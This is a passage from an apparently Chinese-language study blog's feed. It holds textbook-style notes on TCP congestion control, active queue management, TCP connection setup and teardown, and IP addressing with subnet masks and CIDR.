src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_2MKe-jj2gZ.png"></p><h3 id="8-2-6-发送窗口的上限值-xD"><a href="#8-2-6-发送窗口的上限值-xD" class="headerlink" title="8.2.6 发送窗口的上限值&#xD;"></a>8.2.6 发送窗口的上限值&#xD;</h3><p>发送方的发送窗口的上限值应当取为接收方窗口 Rwnd 和拥塞窗口 Cwnd 这两个变量中较小的一个，即应按以下公式确定：</p><p>$$<br>Swnd &#x3D; \min(Rwnd, Cwnd)<br>$$</p><ul><li><p>当 $Rwnd &lt; Cwnd$ 时，是接收方的接收能力限制发送窗口的最大值。</p></li><li><p>当 $Rwnd &gt; Cwnd$ 时，则是网络的拥塞限制发送窗口的最大值。&#x20;</p></li></ul><h2 id="8-3-主动队列管理AQM"><a href="#8-3-主动队列管理AQM" class="headerlink" title="8.3 主动队列管理AQM"></a>8.3 主动队列管理AQM</h2><p>TCP拥塞控制和网络层采取的策略有密切联系。</p><p>重传会使TCP连接的发送端认为在网络中发生了拥塞。于是在TCP的发送端就采取了拥塞控制措施， 但实际上网络并没有发生拥塞。 网络层的策略对TCP拥塞控制影响最大的就是路由器的<strong>分组丢弃策略</strong>。</p><h3 id="8-3-1-“先进先出”FIFO处理规则"><a href="#8-3-1-“先进先出”FIFO处理规则" class="headerlink" title="8.3.1 “先进先出”FIFO处理规则"></a>8.3.1 “先进先出”FIFO处理规则</h3><p>路由器的队列通常都是按照“先进先出”FIFO (First In First Out) 的规则处理到来的分组。</p><p>当队列已满时，以后再到达的所有分组（如果能够继续排队，这些分组都将排在队列的尾部）将都被丢弃。这就叫做尾部丢弃策略 (tail-drop policy)。</p><p>路由器的尾部丢弃往往会导致一连串分组的丢失， 这就使发送方出现超时重传，使TCP进入拥塞控制的慢开始状态，结果使TCP连接的发送方突然把数据的发送速率降低到很小的数值。</p><p>更为严重的是，在网络中通常有很多的TCP连接， 这些连接中的报文段通常是复用在网络层的IP数据报中传送的。</p><p>在这种情况下，若发生了路由器中的尾部丢弃，就可能会同时影响到很多条TCP连接，结果使这许多TCP连接在同一时间突然都进入到慢开始状态。这在TCP 的术语中称为<strong>全局同步</strong> (global syncronization)。</p><p>全局同步使得全网的通信量突然下降了很多，而在网络恢复正常后，其通信量又突然增大很多。</p><h3 id="8-3-2-主动队列管理AQM"><a href="#8-3-2-主动队列管理AQM" class="headerlink" title="8.3.2 主动队列管理AQM"></a>8.3.2 主动队列管理AQM</h3><p>1998年提出了主动队列管理AQM (Active Queue Management)。</p><p>所谓“主动”就是不要等到路由器的队列长度已经达到最大值时才不得不丢弃后面到达的分组。这样就太被动了。应当在队列长度达到某个值得警惕的数值时（即当网络拥塞有了某些拥塞征兆时），就主动丢弃到达的分组。</p><p>提醒发送方放慢发送速率，会有可能减轻网络拥塞甚至不出现拥塞。</p><p>AQM 可以有不同实现方法，其中曾流行多年的就是随机早期检测RED（Random Early Detection）。</p><h3 id="8-3-3-随机早期检测RED"><a href="#8-3-3-随机早期检测RED" class="headerlink" title="8.3.3 随机早期检测RED"></a>8.3.3 随机早期检测RED</h3><p>使路由器的队列维持两个参数：队列长度最小门限THmin和最大门限Thmax 。 RED对每一个到达的分组量，都先计算当前平均队列长度LAV 。</p><ol><li>若平均队列长度小于最小门限THmin，则将新到达的分组放入队列进行排队。</li><li>若平均队列长度超过最大门限THmax，则将新到达的分组丢弃。</li><li>若平均队列长度在最小门限THmin和最大门限THmax 之间，则按照某一概率p将新到达的分组丢弃。</li></ol><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_1Xcn2EUiwd.png"></p><p>多年的实践证明，RED的使用效果并不太理想。 2015年公布的RFC 7567已经把RFC 2309列为陈旧的， 并且不再推荐使用RED。</p><p>对路由器进行主动队列管理AQM仍是必要的。 AQM实际上就是对路由器中的分组排队进行智能管理，而不是简单地把队列的尾部丢弃。 现在已经有几种不同的算法来代替旧的RED，但都还在实验阶段。</p><hr><h1 id="9-TCP的传输连接管理"><a href="#9-TCP的传输连接管理" class="headerlink" title="9 TCP的传输连接管理"></a>9 TCP的传输连接管理</h1><p>传输连接就有三个阶段，即：连接建立、数据传送和连接释放。传输连接的管理就是使传输连接的建立能正常地进行。</p><p>传输建立过程中要解决以下三个问题：</p><ol><li><p>要使每一方能够确知对方的存在。</p></li><li><p>要允许双方协商一些参数（如最大报文段长度，最大窗口大小，服务质量等）。</p></li><li><p>能够对传输实体资源（如缓存大小，连接表中的项目等）进行分配。 &#x20;</p></li></ol><h2 id="9-1-TCP-连接的建立"><a href="#9-1-TCP-连接的建立" class="headerlink" title="9.1 TCP 连接的建立"></a>9.1 TCP 连接的建立</h2><p>用三次握手建立 TCP 连接：</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_PuWXflAhj9.png"></p><p>A 的 TCP 向 B TCP发出连接请求报文段，其首部中的同步位 SYN &#x3D; 1，并选择序号 seq &#x3D; x，表明传送数据时的第一个数据字节的序号是 x。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_oWAT5IphCu.png"></p><p>B 的 TCP 收到连接请求报文段后，如同意，则发回确认。</p><p>B 在确认报文段中应使 SYN &#x3D; 1，使 ACK &#x3D; 1，其确认号ack &#x3D; x + 1，自己选择的序号 seq &#x3D; y。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_7zCKAYl848.png"></p><p>A 收到此报文段后向 B 给出确认，其 ACK &#x3D; 1，确认号 ack &#x3D; y + 1。</p><p>A 的 TCP 通知上层应用进程，连接已经建立。  &#x20;</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_6CfvaQEYsM.png"></p><p>&#x20;B 的 TCP 收到主机 A 的确认后，也通知其上层应用进程：TCP 连接已经建立。</p><p>用三次握手建立 TCP 连接的各状态：</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_4y3XQ2HMNx.png"></p><p>上述B发送给A的报文段也可以拆分成两个报文段，可以先发送一个确认报文段（ACK＝１，ack&#x3D;x+1），然后再发送一个同步报文段（SYN&#x3D;1，seq&#x3D;y），这样就变成了四报文握手。</p><h2 id="9-2-TCP-的连接释放"><a href="#9-2-TCP-的连接释放" class="headerlink" title="9.2 TCP 的连接释放"></a>9.2 TCP 的连接释放</h2><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_jYGFNDenkV.png"></p><p>数据传输结束后，通信的双方都可释放连接。现在 A 的应用进程先向其 TCP 发出连接释放报文段，并停止再发送数据，主动关闭 TCP 连接。</p><p>A 把连接释放报文段首部的 FIN &#x3D; 1，其序号 seq &#x3D; u，等待 B 的确认。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image__KQ5zj73h9.png"></p><p>B 发出确认，确认号 ack &#x3D; u + 1，而这个报文段自己的序号seq &#x3D; v。TCP 服务器进程通知高层应用进程。</p><p>从 A 到 B 这个方向的连接就释放了，TCP 连接处于半关闭状态。B 若发送数据，A 仍要接收。</p><blockquote><p>一个方向的连接是什么意思？发送窗口没了？</p></blockquote><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_uwagaidnwr.png"></p><p>若 B 已经没有要向 A 发送的数据，其应用进程就通知 TCP 释放连接。&#x20;</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_Sdh3Mrz-Ih.png"></p><p>A 收到连接释放报文段后，必须发出确认。&#x20;</p><p>在确认报文段中 ACK &#x3D; 1，确认号 ack &#x3D; w + 1，自己的序号 seq &#x3D; u + 1。&#x20;</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_fgqRLXBtCI.png"></p><p>TCP 连接必须经过时间 2MSL 后才真正释放掉。&#x20;</p><ol><li><p>为了保证 A 发送的最后一个 ACK 报文段能够到达 B。</p></li><li><p>防止 “已失效的连接请求报文段”出现在本连接中。A 在发送完最后一个 ACK 报文段后，再经过时间 2MSL，就可以使本连接持续的时间内所产生的所有报文段，都从网络中消失。这样就可以使下一个新的连接中不会出现这种旧的连接请求报文段。</p></li></ol><p>除了时间等待计时器外，TCP还设有一个<strong>保活计时器</strong>，防止另一方突然下线。</p><h2 id="9-3-TCP-的有限状态机"><a href="#9-3-TCP-的有限状态机" class="headerlink" title="9.3 TCP 的有限状态机"></a>9.3 TCP 的有限状态机</h2><p>TCP 有限状态机的图中每一个方框都是 TCP 可能具有的状态。</p><p>每个方框中的大写英文字符串是 TCP 标准所使用的 TCP 连接状态名。状态之间的箭头表示可能发生的状态变迁。</p><p>箭头旁边的字，表明引起这种变迁的原因，或表明发生状态变迁后又出现什么动作。</p><p>图中有三种不同的箭头。</p><ol><li><p>粗实线箭头表示对客户进程的正常变迁。</p></li><li><p>粗虚线箭头表示对服务器进程的正常变迁。</p></li><li><p>另一种细线箭头表示异常变迁。&#x20;</p></li></ol><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/image_Q6kvt1QG4m.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络第4章：网络层</title>
      <link href="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/"/>
      <url>/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="1-网络层提供的两种服务"><a href="#1-网络层提供的两种服务" class="headerlink" title="1 网络层提供的两种服务"></a>1 网络层提供的两种服务</h1><p>在计算机网络领域，网络层应该向运输层提供怎样的服务（“面向连接”还是“无连接”）曾引起了长期的争论。</p><p>争论焦点的实质就是：在计算机通信中，可靠交付应当由谁来负责？是网络还是端系统？</p><h2 id="1-1-观点1：面向连接，即让网络负责可靠交付"><a href="#1-1-观点1：面向连接，即让网络负责可靠交付" class="headerlink" title="1.1 观点1：面向连接，即让网络负责可靠交付"></a>1.1 观点1：面向连接，即让网络负责可靠交付</h2><p>建立虚电路（Virtual Circuit），以保证双方通信所需的一切网络资源。设计并使用可靠传输的网络协议，使源端所发送的分组实现通过虚电路无差错地按序地到达目的端。</p><h3 id="1-1-1-虚电路服务"><a href="#1-1-1-虚电路服务" class="headerlink" title="1.1.1 虚电路服务"></a>1.1.1 虚电路服务</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_Ipt9uXK6bP.png"></p><p>当在H1（源端）和H2（目的端）建立了虚电路后，H1 发送给 H2 的所有分组都沿着同一条虚电路传送，分组传输完毕后可以拆除该虚电路，也可长期保留。</p><p>虚电路表示这只是一条逻辑上的连接，分组都沿着这条逻辑连接按照存储转发（由中间路由器完成）方式传送，而并不是真正建立了一条物理连接。</p><p>请注意，电路交换是先建立了一条真正的连接。因此分组交换的虚连接和电路交换的连接只是类似，并不完全一样。</p><h2 id="1-2-观点2：不面向连接，即不让网络负责可靠交付"><a href="#1-2-观点2：不面向连接，即不让网络负责可靠交付" class="headerlink" title="1.2 观点2：不面向连接，即不让网络负责可靠交付"></a>1.2 观点2：不面向连接，即不让网络负责可靠交付</h2><p>网络层向上（如传输层或调用IP协议的协议）只提供简单灵活的、无连接的、尽最大努力交付的数据报服务。</p><p>网络在发送分组时不需要事先建立连接。每一个分组（即 IP 数据报）均独立发送，与其前后的分组无关。</p><p>网络层不提供服务质量的承诺。即所传送的分组可能会出现出错、丢失、重复和失序（不按序到达终点）等问题，同时也不保证分组传送的时限。</p><h3 id="1-2-1-数据报服务"><a href="#1-2-1-数据报服务" class="headerlink" title="1.2.1 数据报服务"></a>1.2.1 数据报服务</h3><p>如下图所示，H1 发送给 H2 的分组可能沿着不同路径传送。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_VbBGeHxeIc.png"></p><p>由于传输网络不提供端到端的可靠传输服务，这就使网络中的路由器可以做得比较简单，而且价格低廉（与电信网的交换机相比较）。</p><p>如果主机（即端系统）中的进程之间的通信需要是可靠的，那么就由网络的主机中的运输层负责（包括差错处理、流量控制等）。</p><p>采用这种设计思路的好处是：网络的造价大大降低，运行方式灵活，能够适应多种应用。因特网能够发展到今日的规模，充分证明了当初采用这种设计思路的正确性。</p><h2 id="1-3-虚电路服务与数据报服务对比"><a href="#1-3-虚电路服务与数据报服务对比" class="headerlink" title="1.3 虚电路服务与数据报服务对比"></a>1.3 虚电路服务与数据报服务对比</h2><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_stot7ODGKS.png"></p><hr><h1 id="2-网际协议IP"><a href="#2-网际协议IP" class="headerlink" title="2 网际协议IP"></a>2 网际协议IP</h1><p>网际协议 IP 是 TCP&#x2F;IP 体系中两个最主要的协议之一。与 IP 协议配套使用的还有三个协议：</p><ol><li><p>地址解析协议 ARP（Address Resolution Protocol）</p></li><li><p>网际控制报文协议 ICMP（Internet Control Message Protocol）</p></li><li><p>网际组管理协议 IGMP（Internet Group Management Protocol）</p></li></ol><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_d2UQsMT-s9.png"></p><h2 id="2-1-虚拟互连网络"><a href="#2-1-虚拟互连网络" class="headerlink" title="2.1 虚拟互连网络"></a>2.1 虚拟互连网络</h2><p>互连在一起的网络要进行通信，会遇到许多问题需要解决，如：</p><ol><li>不同的寻址方案</li><li>不同的最大分组长度</li><li>不同的网络接入机制</li><li>不同的超时控制</li><li>不同的差错恢复方法</li><li>不同的状态报告方法</li><li>不同的路由选择技术</li><li>不同的用户接入控制</li><li>不同的服务（面向连接服务和无连接服务）</li><li>不同的管理与控制方式</li></ol><p>没有单一的网络能够适应所有用户的需要。此外，网络互相连接起来要使用一些中间设备。中间设备又称为中间系统或中继(relay)系统。</p><ul><li>物理层中继系统：转发器(repeater)。</li><li>数据链路层中继系统：网桥或桥接器(bridge)以及交换机。</li><li>网络层中继系统：路由器(router)。</li><li>网桥和路由器的混合物：桥路器(brouter)。</li><li>网络层以上的中继系统：网关(gateway)。</li></ul><p>当中继系统是转发器或网桥时，一般并不称之为网络互连，因为这仅仅是把一个网络扩大了，而这仍然是一个网络。</p><p>网关由于比较复杂，目前使用得较少。互联网都是指用路由器进行互连的网络，由于历史的原因，许多有关 TCP&#x2F;IP 的文献将网络层使用的路由器称为网关。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_RDf1al-1oI.png"></p><p>所谓虚拟互连网络也就是逻辑互连网络，它的意思就是互连起来的各种物理网络的异构性本来是客观存在的，但是我们利用 IP 协议就可以使这些性能各异的网络从用户看起来好像是一个统一的网络。</p><p>使用 IP 协议的虚拟互连网络可简称为 IP 网。</p><p>使用虚拟互连网络的好处是：当互联网上的主机进行通信时，就好像在一个网络上通信一样，而看不见互连的各具体的网络异构细节。</p><p>在IP网中，IP数据包的传输过程如下图所示：</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_EmueqyO0ZI.png"></p><p>互联网可以由多种异构网络互连组成，如果我们只从网络层考虑问题，那么 IP 数据报就可以想象是在网络层中传送。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_Qvru5eHv3R.png"></p><p>分组在传送过程中的每一次转发都成为一“跳（hop）”，每一跳两端的两个结点都必定直接连接在同一个网络上。</p><h2 id="2-2-IP地址"><a href="#2-2-IP地址" class="headerlink" title="2.2 IP地址"></a>2.2 IP地址</h2><h3 id="2-2-1-IP-地址及其表示方法"><a href="#2-2-1-IP-地址及其表示方法" class="headerlink" title="2.2.1 IP 地址及其表示方法"></a>2.2.1 IP 地址及其表示方法</h3><p>我们把整个因特网看成为一个单一的、抽象的网络。IP 地址就是给每个连接在因特网上的主机（或路由器）分配一个在全世界范围是唯一的 32 位的标识符。</p><p>IP 地址现在由因特网名字与号码指派公司ICANN（Internet Corporation for Assigned Names and Numbers）进行分配。</p><p>IP 地址的编址方法（有三类）：</p><ol><li><strong>分类 IP 地址</strong>。这是最基本编址方法，1981年通过相应的标准协议。</li><li><strong>子网的划分</strong>。这是对最基本编址方法的改进，其标准[RFC 950]在 1985 年通过。</li><li><strong>无分类 IP 地址</strong>。这是比较新的编址方法。1993 年提出后很快就得到推广应用。</li></ol><h3 id="2-2-2-分类-IP-地址"><a href="#2-2-2-分类-IP-地址" class="headerlink" title="2.2.2 分类 IP 地址"></a>2.2.2 分类 IP 地址</h3><p>每一类地址都由两个固定长度的字段组成，其中一个字段是网络号 net-id，它标志主机（或路由器）所连接到的网络，而另一个字段则是主机号 host-id，它标志该主机（或路由器）。</p><p>两级的 IP 地址可以记为：</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_lbxnUoKGWl.png"></p><p>IPv4地址表示方法：</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_sUvrJjPn2J.png"></p><p>按网络规模划分为A、B、C三类：</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_4TbBC6P1FS.png"></p><ol><li>A 类地址的网络号字段 net-id 为 1 字节，host-id 为 3 字节</li><li>B 类地址的网络号字段 net-id 为 2 字节，host-id 为 2 字节</li><li>C 类地址的网络号字段 net-id 为 3 字节，host-id 为 1 字节</li><li>D 类地址是多播地址</li><li>E 类地址保留为今后使用&#x20;</li></ol><p>在相应的规则下，IP 地址的使用范围：</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_9yEWq8f_2Z.png"></p><h3 id="2-2-3-子网的划分"><a href="#2-2-3-子网的划分" class="headerlink" title="2.2.3 子网的划分"></a>2.2.3 子网的划分</h3><p>划分子网纯属一个单位内部的事情。单位对外仍然表现为没有划分子网的网络。</p><p>从主机号借用若干个位作为子网号 subnet-id，而主机号 host-id 也就相应减少了若干个位。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_oG6zz7SjvY.png"></p><p>凡是从其他网络发送给本单位某个主机的 IP 数据报，仍然是根据 IP 数据报的目的网络号 net-id，先找到连接在本单位网络上的路由器。</p><p>然后此路由器在收到 IP 数据报后，再按目的网络号 net-id 和子网号 subnet-id 找到目的子网。</p><p>最后就将 IP 数据报直接交付目的主机。&#x20;</p><h4 id="2-2-3-1-一个未划分子网的-B-类网络145-13-0-0"><a href="#2-2-3-1-一个未划分子网的-B-类网络145-13-0-0" class="headerlink" title="2.2.3.1 一个未划分子网的 B 类网络145.13.0.0"></a>2.2.3.1 一个未划分子网的 B 类网络145.13.0.0</h4><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_2NBXj0ueXa.png"></p><h4 id="2-2-3-2-划分为三个子网后对外仍是一个网络"><a href="#2-2-3-2-划分为三个子网后对外仍是一个网络" class="headerlink" title="2.2.3.2 划分为三个子网后对外仍是一个网络"></a>2.2.3.2 划分为三个子网后对外仍是一个网络</h4><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_GZMSsTO7Sf.png"></p><p><strong>划分子网后变成了三级结构</strong>：</p><ul><li><p>当没有划分子网时，IP 地址是两级结构。</p></li><li><p>划分子网后 IP 地址就变成了三级结构。</p></li><li><p>划分子网只是把 IP 地址的主机号 host-id 这部分进行再划分，而不改变 IP 地址原来的网络号 net-id。</p></li></ul><h4 id="2-2-3-3-子网掩码"><a href="#2-2-3-3-子网掩码" class="headerlink" title="2.2.3.3 子网掩码"></a>2.2.3.3 子网掩码</h4><p>从一个 IP 数据报的首部并无法判断源主机或目的主机所连接的网络是否进行了子网划分。<br>使用子网掩码（subnet mask）可以找出 IP 地址中的子网部分。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_2CpKHTXGSt.png"></p><blockquote><p>(IP 地址) AND (子网掩码) &#x3D; 网络地址</p></blockquote><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_wFJciNkj9h.png"></p><blockquote><p>默认子网掩码</p></blockquote><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_XjtLhS0jbt.png"></p><ul><li><p>子网掩码是一个网络或一个子网的重要属性。</p></li><li><p>路由器在和相邻路由器交换路由信息时，必须把自己所在网络（或子网）的子网掩码告诉相邻路由器。</p></li><li><p>路由器的路由表中的每一个项目，除了要给出目的网络地址外，还必须同时给出该网络的子网掩码。</p></li><li><p>若一个路由器连接在两个子网上就拥有两个网络地址和两个子网掩码。</p></li></ul><blockquote><p>【例】 IP 地址是 141.14.72.24，子网掩码是 255.255.192.0<br>&#x20; 问：该IP地址的网络地址是多少？&#x20;</p></blockquote><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_vFH7XSlUpZ.png"></p><blockquote><p>在上例中，若子网掩码改为255.255.224.0。试求网络地址，讨论所得结果。</p></blockquote><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_BdX4-BTkrt.png"></p><p><strong>结论</strong>：不同的子网掩码得出相同的网络地址，但不同的掩码的效果是不同的。&#x20;</p><h3 id="2-2-4-无分类编址-CIDR"><a href="#2-2-4-无分类编址-CIDR" class="headerlink" title="2.2.4 无分类编址 CIDR"></a>2.2.4 无分类编址 CIDR</h3><p>1987 年，RFC 1009 就指明了在一个划分子网的网络中可同时使用几个不同的子网掩码。使用变长子网掩码 VLSM (Variable Length Subnet Mask)可进一步提高 IP 地址资源的利用率。</p><p>在 VLSM 的基础上又进一步研究出无分类编址方法，它的正式名字是无分类域间路由选择 CIDR (Classless Inter-Domain Routing)。&#x20;</p><h4 id="2-2-4-1-CIDR-最主要的特点"><a href="#2-2-4-1-CIDR-最主要的特点" class="headerlink" title="2.2.4.1 CIDR 最主要的特点"></a>2.2.4.1 CIDR 最主要的特点</h4><ol><li><p>CIDR 消除了传统的 A 类、B 类和 C 类地址以及划分子网的概念，因而可以更加有效地分配 IPv4 的地址空间。</p></li><li><p>CIDR使用各种长度的“网络前缀”（network-prefix）来代替分类地址中的网络号和子网号。</p></li><li><p>IP 地址从三级编址（使用子网掩码）又回到了两级编址。</p></li></ol><p>无分类的两级编址的记法是：</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_3XjBNVf3GL.png"></p><ul><li>CIDR 还使用“斜线记法”(slash notation)，它又称为CIDR记法，即在 IP 地址后面加上一个斜线“&#x2F;”，然后写上网络前缀所占的位数（这个数值对应于三级编址中子网掩码中 1 的个数）。</li><li>CIDR 把网络前缀都相同的连续的 IP 地址组成“CIDR 地址块”。</li></ul><h4 id="2-2-4-2-CIDR-地址块"><a href="#2-2-4-2-CIDR-地址块" class="headerlink" title="2.2.4.2 CIDR 地址块"></a>2.2.4.2 CIDR 地址块</h4><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_A9B5wG4urI.png"></p><h4 id="2-2-4-3-路由聚合（route-aggregation）"><a href="#2-2-4-3-路由聚合（route-aggregation）" class="headerlink" title="2.2.4.3 路由聚合（route aggregation）"></a>2.2.4.3 路由聚合（route aggregation）</h4><p>一个 CIDR 地址块可以表示很多地址，这种地址的聚合常称为<strong>路由聚合</strong>，它使得路由表中的一个项目可以表示很多个（例如上千个）原来传统分类地址的路由。</p><p>路由聚合也称为<strong>构成超网</strong>（supernetting）。</p><p>CIDR 虽然不使用子网了，但仍然使用“掩码”这一名词（但不叫子网掩码）。对于 &#x2F;20  地址块，它的掩码是 20 个连续的 1。 斜线记法中的数字就是掩码中1的个数。  &#x20;</p><h4 id="2-2-4-4-CIDR-记法的其他形式"><a href="#2-2-4-4-CIDR-记法的其他形式" class="headerlink" title="2.2.4.4 CIDR 记法的其他形式"></a>2.2.4.4 CIDR 记法的其他形式</h4><ul><li><p>0.0.0.0&#x2F;10 可简写为 10&#x2F;10，也就是将点分十进制中低位连续的 0 省略</p></li><li><p>10.0.0.0&#x2F;10 相当于指出 IP 地址 10.0.0.0 的掩码是 255.192.0.0，即<code>11111111 11000000 00000000 00000000</code></p></li><li><p>网络前缀的后面加一个星号 * 的表示方法，如 <code>00001010 00*</code>，在星号 * 之前是网络前缀，而星号 * 表示 IP 地址中的主机号，可以是任意值。</p></li></ul><h4 id="2-2-4-5-CIDR-地址块划分举例"><a href="#2-2-4-5-CIDR-地址块划分举例" class="headerlink" title="2.2.4.5 CIDR 地址块划分举例"></a>2.2.4.5 CIDR 地址块划分举例</h4><p><img 